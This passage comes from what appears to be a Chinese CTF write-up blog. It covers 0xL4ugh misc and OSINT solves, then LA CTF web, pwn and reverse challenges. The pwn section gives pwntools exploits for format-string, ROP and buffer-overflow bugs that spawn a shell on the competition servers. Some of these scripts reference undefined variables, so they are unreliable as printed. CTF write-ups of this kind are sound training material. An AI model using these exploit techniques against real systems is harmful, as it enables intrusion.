09 0D 0A 09 0D 0A 20 20 20 20 20 09 09 20 09 20 20 20 0D 0A 09 0D 0A 20 20 20 20 20 09 09 09 09 20 09 09 0D 0A 09 0D 0A 20 20 20 20 20 09 20 20 20 09 09 20 0D 0A 09 0D 0A 20 20 20 20 20 20 09 09 20 09 20 20 0D 0A 09 0D 0A 20 20 20 20 20 09 20 09 20 20 09 09 0D 0A 09 0D 0A 20 20 20 20 20 20 09 09 20 09 20 09 0D 0A 09 0D 0A 20 20 20 20 20 09 20 09 09 09 09 09 0D 0A 09 0D 0A 20 20 20 20 20 20 09 09 20 09 20 20 0D 0A 09 0D 0A 20 20 20 20 20 20 09 09 20 09 20 09 0D 0A 09 0D 0A 20 20 20 20 20 09 20 09 09 09 09 09 0D 0A 09 0D 0A 20 20 20 20 20 09 20 09 09 20 09 20 0D 0A 09 0D 0A 20 20 20 20 20 20 09 09 20 09 20 20 0D 0A 09 0D 0A 20 20 20 20 20 09 20 09 20 20 09 20 0D 0A 09 0D 0A 20 20 20 20 20 20 09 09 20 09 20 20 0D 0A 09 0D 0A 20 20 20 20 20 09 20 20 09 20 09 09 0D 0A 09 0D 0A 20 20 20 20 20 20 09 09 20 20 20 09 0D 0A 09 0D 0A 20 20 20 20 20 09 20 09 09 09 09 09 0D 0A 09 0D 0A 20 20 20 20 20 09 20 20 20 20 09 20 0D 0A 09 0D 0A 20 20 20 20 20 20 09 09 20 20 20 20 0D 0A 09 0D 0A 20 20 20 20 20 09 20 20 09 20 20 09 0D 0A 09 0D 0A 20 20 20 20 20 09 09 09 09 09 20 09 0D 0A 09 0D 0A 20 20 0D 0A 0D 0A 0D 0A&#x27;</span><br><br>a=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flag.split(<span class="hljs-string">&#x27; &#x27;</span>):<br>    <span class="hljs-keyword">if</span> i == <span class="hljs-string">&#x27;20&#x27;</span>:<br>      a+=<span class="hljs-string">&#x27;0&#x27;</span><br>    <span class="hljs-keyword">if</span> i == <span class="hljs-string">&#x27;09&#x27;</span>:<br>       a+=<span class="hljs-string">&#x27;1&#x27;</span><br>    <span class="hljs-keyword">if</span> i == <span class="hljs-string">&#x27;0D&#x27;</span>:<br>       a+=<span class="hljs-string">&#x27; &#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a.split(<span class="hljs-string">&#x27; &#x27;</span>):<br>   <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(i)&gt;<span class="hljs-number">2</span>:<br>      <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(i,<span class="hljs-number">2</span>)),end=<span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-comment">#0xL4ugh&#123;F4S5_45_Z4R4K1_B0I&#125;</span><br></code></pre></td></tr></table></figure><h3 id="Colorful"><a href="#Colorful" class="headerlink" title="Colorful"></a>Colorful</h3><h4 id="题目说明-6"><a href="#题目说明-6" class="headerlink" title="题目说明"></a>题目说明</h4><h4 id="解题思路-9"><a href="#解题思路-9" class="headerlink" title="解题思路"></a>解题思路</h4><p><a href="https://www.dcode.fr/hexahue-cipher">https://www.dcode.fr/hexahue-cipher</a><br><code>0xL4ugh&#123;TH1S_15_H3X4HU3_C0D3&#125;</code></p><h3 id="4-Bloody"><a href="#4-Bloody" class="headerlink" title="4.Bloody"></a>4.Bloody</h3><p>just line ? but it contain a lot of infoooooooos</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>img = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./Bloody.png&quot;</span>)<br>flag=<span class="hljs-string">&#x27;&#x27;</span><br>h, w= (img.size)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(h):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(w):<br>        pixel = (img.getpixel((i,j)))<br>        <span class="hljs-keyword">if</span> pixel != (<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">0</span>):<br>          flag+=<span class="hljs-built_in">chr</span>(pixel[<span class="hljs-number">0</span>])<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;&#125;&#x27;</span> <span class="hljs-keyword">in</span> flag:<br>           <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-comment">#0xL4ugh&#123;R_G_B_FOR_TH3_W1N&#125;</span><br></code></pre></td></tr></table></figure><h2 id="Osint"><a href="#Osint" class="headerlink" title="Osint"></a>Osint</h2><h3 id="Cat"><a href="#Cat" class="headerlink" title="Cat"></a>Cat</h3><h4 id="题目说明-7"><a href="#题目说明-7" class="headerlink" title="题目说明"></a>题目说明</h4><p>i lost my cat a while ago , and recently i found a photo of it can you help me track my cat by getting the location of this image.<br>flag is in the format: 0xL4ugh{Latitude,Longitude}. Use the 6 digits after the decimal point. (ex: 112.1234567 –&gt; 112.123456)</p><h4 id="解题思路-10"><a href="#解题思路-10" class="headerlink" title="解题思路"></a>解题思路</h4><p>图片左下角<code>Saswat Kumar Dash</code>是摄影师<br>google<code>Saswat Kumar Dash Cat</code><br>通过图片附件的名字找到了一模一样的图<code>[https://www.flickr.com/photos/95789140@N05/10472912333](https://www.flickr.com/photos/95789140@N05/10472912333)</code><br><img src="/mdimg/0xl4/10.png"><br>在网站有拍摄地点<br>在url上显示了经纬度<br><code>[https://www.flickr.com/map/?fLat=29.386886&amp;fLon=47.977166&amp;zl=13&amp;everyone_nearby=1&amp;photo=10472912333](https://www.flickr.com/map/?fLat=29.386886&amp;fLon=47.977166&amp;zl=13&amp;everyone_nearby=1&amp;photo=10472912333)</code><br><code>0xL4ugh&#123;29.386886,47.977166&#125;</code></p><h3 id="Hacker"><a href="#Hacker" class="headerlink" title="Hacker"></a>Hacker</h3><h4 id="题目说明-8"><a href="#题目说明-8" class="headerlink" title="题目说明"></a>题目说明</h4><p>A hacker named z1Luxiboy bypassed our system protection with a Bay pass tool</p><h4 id="解题思路-11"><a href="#解题思路-11" class="headerlink" title="解题思路"></a>解题思路</h4><p><img src="/mdimg/0xl4/11.png"><br><code>[https://www.reddit.com/user/z1Luxiboy/comments/1149mst/%D8%A8%D9%88%D8%B4%D9%83%D8%A7%D9%83_%D9%85%D8%AD%D9%81%D9%88%D8%B8/](https://www.reddit.com/user/z1Luxiboy/comments/1149mst/%D8%A8%D9%88%D8%B4%D9%83%D8%A7%D9%83_%D9%85%D8%AD%D9%81%D9%88%D8%B8/)</code><br><img src="/mdimg/0xl4/12.png"><br><img src="/mdimg/0xl4/13.png"><code>找与这个评论的id相关的 z1Marvelman</code><br>找到github这个b的github<code>[https://github.com/Marvel0x11?tab=repositories](https://github.com/Marvel0x11?tab=repositories)</code><br>有一个骗人的flag<br><code>[https://github.com/Marvel0x11/Baypass-tool/commit/792cc0477af3a8703919133c293877d086908e6a](https://github.com/Marvel0x11/Baypass-tool/commit/792cc0477af3a8703919133c293877d086908e6a)</code><br><img src="/mdimg/0xl4/14.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>比赛Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>LA CTF-wp by Hor1zon</title>
    <link href="/2023/02/14/LA%20CTF/"/>
    <url>/2023/02/14/LA%20CTF/</url>
    
    <content type="html"><![CDATA[<p><strong>题目附件官方：<a href="https://github.com/uclaacm/lactf-archive/tree/master/2023">https://github.com/uclaacm/lactf-archive/tree/master/2023</a></strong></p><p><img src="/img/g.png"></p><p><img src="/mdimg/lactf/640.gif"></p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="metaverse"><a href="#metaverse" class="headerlink" title="metaverse"></a>metaverse</h3><h4 id="题目说明"><a href="#题目说明" class="headerlink" title="题目说明"></a>题目说明</h4><p>Metaenter the metaverse and metapost about metathings. All you have to metado is metaregister for a metaaccount and you’re good to metago.<br><a href="https://metaverse.lac.tf/">https://metaverse.lac.tf/</a><br>You can metause our fancy new metaadmin metabot to get the admin to metaview your metapost!</p><h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><p>g0at：应该是有人(zhanyi✌)打穿了，鼠鼠直接捡漏，账号密码123就直接进去了捏<br><img src="/mdimg/lactf/1.png"></p><h3 id="college-tour"><a href="#college-tour" class="headerlink" title="college-tour"></a><strong>college-tour</strong></h3><h4 id="题目说明-1"><a href="#题目说明-1" class="headerlink" title="题目说明"></a>题目说明</h4><p>Welcome to UCLA! To explore the #1 public college, we have prepared a scavenger hunt for you to walk all around the beautiful campus.<br><img src="/mdimg/lactf/2.png"></p><h4 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h4><p><img src="/mdimg/lactf/3.png"><br>到处找flag就行了<br><code>lactf&#123;j03_4nd_j0S3phIn3_bRU1n_sAY_hi&#125;</code></p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="rut-roh-relro"><a href="#rut-roh-relro" class="headerlink" title="rut-roh-relro"></a><strong>rut-roh-relro</strong></h3><h4 id="题目说明-2"><a href="#题目说明-2" class="headerlink" title="题目说明"></a>题目说明</h4><p>My friend keeps writing super insecure C programs but I’m too lazy to fix his code. I’m sure it’ll be fine as long as I use enough exploit mitigations, right?<br><code>nc lac.tf 31134</code></p><h4 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&quot;./rut_roh_relro&quot;</span>)<br>p = remote(<span class="hljs-string">&quot;lac.tf&quot;</span>,<span class="hljs-number">31134</span>)<br>elf = ELF(<span class="hljs-string">&quot;./rut_roh_relro&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>context(arch=<span class="hljs-string">&quot;amd64&quot;</span>,os=<span class="hljs-string">&quot;linux&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;terminator&#x27;</span>, <span class="hljs-string">&#x27;--new-tab&#x27;</span>, <span class="hljs-string">&#x27;-x&#x27;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">src</span>):<br>    gdb.attach(p,src)<br>    pause()<br><br>src = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">b *$rebase(0x11C6)</span><br><span class="hljs-string">b *$rebase(0x1201)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-comment"># dbg(src)</span><br>g=<span class="hljs-string">&quot;%71$p %72$p&quot;</span><br>p.sendlineafter(<span class="hljs-string">&quot;What would you like to post?&quot;</span>,g)<br><br>p.recvuntil(<span class="hljs-string">&quot;Here&#x27;s your latest post:\n&quot;</span>)<br>libc_base = <span class="hljs-built_in">int</span>(r.recvuntil(<span class="hljs-string">&quot; &quot;</span>)[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>) - <span class="hljs-number">234</span> - libc.symbols[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>success(<span class="hljs-string">&quot;libc_base = &quot;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br><br>stack_addr = <span class="hljs-built_in">int</span>(r.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>)[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>ret_stack = stack_addr - <span class="hljs-number">0xf0</span><br>success(<span class="hljs-string">&quot;ret_stack = &quot;</span>+<span class="hljs-built_in">hex</span>(ret_stack))<br><br>start_stack = stack_addr - <span class="hljs-number">0xf0</span> - <span class="hljs-number">0x20</span><br><br>gadget = <span class="hljs-number">0xc967a</span><br>one_gadget = libc_base+gadget<br><br>system_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh = libc_base + libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>).__next__()<br>pop_rdi_ret = libc_base + <span class="hljs-number">0x0000000000023796</span><br><br>g = fmtstr_g(<span class="hljs-number">6</span>, &#123;ret_stack:pop_rdi_ret,ret_stack+<span class="hljs-number">8</span>:bin_sh,ret_stack+<span class="hljs-number">0x10</span>:system_addr&#125;, write_size=<span class="hljs-string">&#x27;byte&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;What would you like to post?&quot;</span>,pg)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p><img src="/mdimg/lactf/4.png"></p><h3 id="redact"><a href="#redact" class="headerlink" title="redact"></a>redact</h3><h4 id="题目说明-3"><a href="#题目说明-3" class="headerlink" title="题目说明"></a>题目说明</h4><p>I heard C was insecure so I wrote my flag redactor program in C++.<br><code>nc lac.tf 31281</code><br>Note: There are multiple optimized implementations of <code>memmove</code> and one is selected at runtime based on available CPU features, meaning that any solution that uses the <code>memmove</code> GOT entry could fail on remote. The challenge is solvable without <code>memmove</code>.</p><h4 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&quot;./redact&quot;</span>)<br>p = remote(<span class="hljs-string">&quot;lac.tf&quot;</span>,<span class="hljs-number">31181</span>)<br>elf = ELF(<span class="hljs-string">&quot;./redact&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>context(arch=<span class="hljs-string">&quot;amd64&quot;</span>,os=<span class="hljs-string">&quot;linux&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;terminator&#x27;</span>, <span class="hljs-string">&#x27;--new-tab&#x27;</span>, <span class="hljs-string">&#x27;-x&#x27;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">src</span>):<br>    gdb.attach(p,src)<br>    pause()<br><br>src = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">b *0x40149a</span><br><span class="hljs-string">b *0x4012F9</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>pop_rdi_ret = <span class="hljs-number">0x000000000040177b</span><br>pop_rsi_r15_ret = <span class="hljs-number">0x0000000000401779</span><br>start_addr = <span class="hljs-number">0x401120</span><br><br><span class="hljs-comment"># dbg(src)</span><br>g=<span class="hljs-string">&#x27;a&#x27;</span><br>p.sendlineafter(<span class="hljs-string">&quot;Enter some text: &quot;</span>,g)<br><br>g=<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x48</span>+p64(pop_rdi_ret)+p64(<span class="hljs-number">0x4040C0</span>)+p64(pop_rsi_r15_ret)+p64(<span class="hljs-number">0x403FE8</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x4010C0</span>)+p64(start_addr)<br>p.sendlineafter(<span class="hljs-string">&quot;Enter a placeholder: &quot;</span>,g)<br><br>index = <span class="hljs-number">0</span><br>p.sendlineafter(<span class="hljs-string">&quot;Enter the index of the stuff to redact: &quot;</span>,<span class="hljs-built_in">str</span>(index))<br><br>libc_base = u64(r.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>)) - libc.symbols[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>success(<span class="hljs-string">&quot;libc_base = &quot;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br><br>system_addr = libc_base+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh = libc_base+libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>).__next__()<br><br>g=<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x48</span>+p64(pop_rdi_ret)+p64(bin_sh)+p64(system_addr)<br>p.sendlineafter(<span class="hljs-string">&quot;Enter a placeholder: &quot;</span>,g)<br>index = <span class="hljs-number">0</span><br>p.sendlineafter(<span class="hljs-string">&quot;Enter the index of the stuff to redact: &quot;</span>,<span class="hljs-built_in">str</span>(index))<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p><img src="/mdimg/lactf/5.png"></p><h3 id="gatekeep"><a href="#gatekeep" class="headerlink" title="gatekeep"></a>gatekeep</h3><h4 id="题目说明-4"><a href="#题目说明-4" class="headerlink" title="题目说明"></a>题目说明</h4><p>If I gaslight you enough, you won’t be able to get my flag! :)<br><code>nc lac.tf 31121</code><br>Note: The attached binary is the exact same as the one executing on the remote server.</p><h4 id="解题思路-4"><a href="#解题思路-4" class="headerlink" title="解题思路"></a>解题思路</h4><p>g0at：一眼丁真的签到题<br><img src="/mdimg/lactf/6.png"><br>主函数，调用了<code>check()</code>函数，跟一下<br><img src="/mdimg/lactf/7.png"><br>逻辑也很简单，让猜密码，密码正确就可以<code>print_flag()</code>但是<code>gets()</code>这里有很明显的溢出，可以看到<code>char s1[15]</code>，所以我们只要输入一个大的数就可以直接绕过<code>check()</code>函数，直接cat flag<br><img src="/mdimg/lactf/9.png"></p><h3 id="bot"><a href="#bot" class="headerlink" title="bot"></a>bot</h3><h4 id="题目说明-5"><a href="#题目说明-5" class="headerlink" title="题目说明"></a>题目说明</h4><p>I made a bot to automatically answer all of your questions.<br><code>nc lac.tf 31180</code></p><h4 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&quot;lac.tf&quot;</span>, <span class="hljs-number">31180</span>)<br>p.recv()<br>g = <span class="hljs-string">b&quot;may i have the flag?\0&quot;</span><br>g += <span class="hljs-string">b&quot;A&quot;</span>*(<span class="hljs-number">64</span>-<span class="hljs-built_in">len</span>(g))<br>g += <span class="hljs-string">b&#x27;BBBBBBBB&#x27;</span><br>g += p64(<span class="hljs-number">0x40129a</span>)<br>p.sendline(g)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="caterpillar"><a href="#caterpillar" class="headerlink" title="caterpillar"></a>caterpillar</h3><h4 id="题目说明-6"><a href="#题目说明-6" class="headerlink" title="题目说明"></a>题目说明</h4><p>-<del>-</del>-<del>-</del>[]? -<del>-</del>-<del>-</del>[].</p><h4 id="解题思路-5"><a href="#解题思路-5" class="headerlink" title="解题思路"></a>解题思路</h4><p>附件为js文件，简言之可以理解为对flag逐一判断是否等于某个值。图中的 <strong>-~[]</strong> 这样的书写形式很特别，猜测可能代表常量？于是在浏览器console解析，发现可以解析为整数常量。那么思路显而易见，把if中代码改成赋值语句即可。<br><img src="/mdimg/lactf/10.png"><br><img src="/mdimg/lactf/11.png"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> flag = <span class="hljs-title class_">Array</span>(<span class="hljs-number">55</span>).<span class="hljs-title function_">fill</span>(<span class="hljs-number">0</span>)<br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = 